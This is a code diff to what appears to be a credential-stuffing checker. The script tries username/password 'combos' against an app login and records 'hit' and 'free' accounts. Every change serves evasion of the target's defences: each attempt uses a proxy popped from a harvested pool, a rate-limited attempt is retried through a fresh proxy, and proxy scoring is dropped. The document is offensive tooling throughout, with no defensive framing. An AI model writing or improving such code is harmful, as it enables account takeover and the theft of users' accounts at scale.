@@ -620,13 +620,19 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
     return "hit", d
 
 def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 1):
-    """Smart retry: quick, no long sleep to avoid stuck (was 4-7s)."""
+    """Smart retry: one proxy per account, use once then discard (fek do)."""
     st, d = check_account_app(user, pw, proxy)
     if st == "rate":
-        # Don't sleep long — just return rate, let next combo use fresh proxy
-        # Quick single retry with new proxy if available
+        # Retry with a fresh proxy from auto-loaded pool, also discard after use
         try:
-            new_proxy = get_random_proxy()
+            new_proxy = None
+            with PROXY_LOCK:
+                if LIVE_PROXIES:
+                    try:
+                        idx = random.randrange(len(LIVE_PROXIES))
+                        new_proxy = LIVE_PROXIES.pop(idx)
+                    except Exception:
+                        new_proxy = LIVE_PROXIES.pop(0) if LIVE_PROXIES else None
             if new_proxy and new_proxy != proxy:
                 time.sleep(0.5)
                 st2, d2 = check_account_app(user, pw, new_proxy)
@@ -874,7 +880,7 @@ def get_random_proxy() -> Optional[dict]:
     with PROXY_LOCK:
         if not LIVE_PROXIES:
             return None
-        # Smart: 70% chance pick top half by score, else random
+        # Smart: 70% chance pick top half by score, else random (non-destructive for oxaam etc)
         if len(LIVE_PROXIES) > 5 and PROXY_SCORES:
             try:
                 scored = sorted(LIVE_PROXIES, key=lambda x: PROXY_SCORES.get(x.get("https",""), 0), reverse=True)
@@ -884,6 +890,20 @@ def get_random_proxy() -> Optional[dict]:
             except Exception:
                 pass
         return random.choice(LIVE_PROXIES)
+
+def pop_random_proxy() -> Optional[dict]:
+    """One-time use proxy: pop from LIVE_PROXIES and discard after use (fek do)."""
+    with PROXY_LOCK:
+        if not LIVE_PROXIES:
+            return None
+        try:
+            idx = random.randrange(len(LIVE_PROXIES))
+            return LIVE_PROXIES.pop(idx)
+        except Exception:
+            try:
+                return LIVE_PROXIES.pop(0) if LIVE_PROXIES else None
+            except Exception:
+                return None
 
 def harvest_proxies() -> List[str]:
     raw = set()
@@ -1223,30 +1243,29 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
         return results
 
     lock = threading.Lock()
-    px_idx = [0]
 
     def next_proxy() -> Optional[dict]:
-        """Round-robin proxy hand-out (Baron style)."""
+        """One account = one proxy from auto-loaded pool, use once then discard (fek do)."""
         with PROXY_LOCK:
             if not LIVE_PROXIES:
                 return None
-            with lock:
-                p = LIVE_PROXIES[px_idx[0] % len(LIVE_PROXIES)]
-                px_idx[0] += 1
+            try:
+                # Random pop for better distribution, discard after use
+                idx = random.randrange(len(LIVE_PROXIES))
+                p = LIVE_PROXIES.pop(idx)
+            except Exception:
+                try:
+                    p = LIVE_PROXIES.pop(0) if LIVE_PROXIES else None
+                except Exception:
+                    p = None
             return p
 
     def worker(cred: dict):
         proxy = next_proxy()
         try:
             r = check_credential(cred, proxy)
-            # Score proxies — hits/free good, bad/rate/err neutral, success updates score
-            if proxy and r["st"] in ("hit", "free"):
-                try:
-                    url = proxy.get("https","")
-                    with PROXY_LOCK:
-                        PROXY_SCORES[url] = PROXY_SCORES.get(url, 0) + 1
-                except Exception:
-                    pass
+            # No scoring reuse — proxy is discarded after one use (fek do)
+            # Keep score for stats only if needed, but proxy already removed
             return cred, r["st"], r["data"]
         except Exception as e:
             return cred, "err", dict(_blank_data(""), info=_clean_err(e))
